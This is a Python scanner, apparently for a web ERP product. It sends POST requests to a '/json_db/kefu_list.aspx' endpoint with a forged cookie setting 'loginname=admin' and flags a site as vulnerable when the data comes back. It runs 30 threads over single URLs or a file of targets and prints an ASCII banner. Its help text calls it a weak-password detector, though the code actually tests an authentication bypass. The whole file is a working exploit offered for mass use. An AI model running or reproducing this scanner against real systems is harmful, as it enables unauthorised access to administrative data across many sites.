#!/usr/bin/python3
# -*- coding:utf-8 -*-
import requests
import argparse
import warnings
import urllib3
import textwrap
from multiprocessing.dummy import Pool

# 关闭警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings("ignore")

# 定义全局变量
PATH = '/json_db/kefu_list.aspx?stype=0&_search=false&nd=1751246532981&rows=25&page=1&sidx=id&sord=asc'
THREADS = 30  # 调整线程数


def check(domain):
    url = domain + PATH
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3029.68 Safari/537.36',
        'Cookie': 'pyerpcookie=loginname=admin'
    }

    try:
        # 禁止自动重定向，以便检查原始响应
        response = requests.post(url, headers=headers, timeout=3, verify=False, allow_redirects=False)

        # 检查状态码和响应内容
        if response.status_code == 200 and 'total' in response.text:
            print(f'[+] {domain} 存在漏洞')
            return True
        # 如果是302重定向，说明认证失败，不存在漏洞
        elif response.status_code == 302:
            # print(f'[-] {domain} 认证失败，不存在漏洞')  # 可选：调试信息
            return False
        else:
            # print(f'[-] {domain} 状态码: {response.status_code}，不存在漏洞')  # 可选：调试信息
            return False

    except requests.exceptions.RequestException as e:
        # 可以选择忽略连接错误或超时
        # print(f'[!] {domain} 请求失败: {str(e)}')  # 可选：调试信息
        return False
    except Exception as e:
        # 其他异常
        # print(f'[!] {domain} 发生错误: {str(e)}')  # 可选：调试信息
        return False


def main():
    parser = argparse.ArgumentParser(
        description='弱口令检测工具',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent('''示例：
            python one.py -u http://www.example.com
            python one.py -f urls.txt''')
    )

    parser.add_argument("-u", dest="url", help="请输入的要检测的URL")
    parser.add_argument("-f", dest="file", help="请输入的要检测的URL文件")

    args = parser.parse_args()

    if not args.url and not args.file:
        parser.print_help()
        return

    if args.url:
        if 'http' not in args.url:
            args.url = f'http://{args.url}'
        check(args.url)

    elif args.file:
        urls = []
        with open(args.file, 'r') as f:
            for line in f:
                domain = line.strip()
                if not domain:
                    continue
                if domain.startswith('http://') or domain.startswith('https://'):
                    urls.append(domain)
                else:
                    urls.append(f'http://{domain}')

        print(f'开始扫描，共 {len(urls)} 个URL')

        # 使用线程池扫描
        pool = Pool(THREADS)
        results = pool.map(check, urls)
        pool.close()
        pool.join()

        # 统计结果
        vulnerable_count = sum(1 for result in results if result)
        print(f'\n扫描完成，共发现 {vulnerable_count} 个存在漏洞的URL')


if __name__ == '__main__':
    banner = """ 
    .___                .___                   .__                        
  __| _/____  ___.__. __| _/____  ___.__. _____|  |   ____   ____ ______  
 / __ |\__  \<   |  |/ __ |\__  \<   |  |/  ___/  | _/ __ \_/ __ \\____ \ 
/ /_/ | / __ \\___  / /_/ | / __ \\___  |\___ \|  |_\  ___/\  ___/|  |_> >
\____ |(____  / ____\____ |(____  / ____/____  >____/\___  >\___  >   __/ 
     \/     \/\/         \/     \/\/         \/          \/     \/|__|    
    """
    print(banner)
    main()